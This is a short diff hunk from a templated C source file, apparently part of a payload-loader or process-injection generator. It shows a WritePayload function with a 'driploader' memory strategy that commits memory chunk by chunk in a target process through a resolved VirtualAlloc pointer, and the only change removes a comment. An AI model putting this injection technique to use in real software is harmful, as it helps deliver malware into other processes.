@@ -10,7 +10,6 @@ void WritePayload(HANDLE hTargetProcess, void* pBaseAddress, const unsigned char
         PVOID chunkAddress = (PBYTE)pBaseAddress + offset;
         
         {% if 'driploader' in memory_strategy %}
-            // COMMIT (Reserved Memory)
             if (hTargetProcess == (HANDLE)-1) {
                 pfnVirtualAlloc(chunkAddress, chunkSize, MEM_COMMIT, PAGE_READWRITE);
             } 
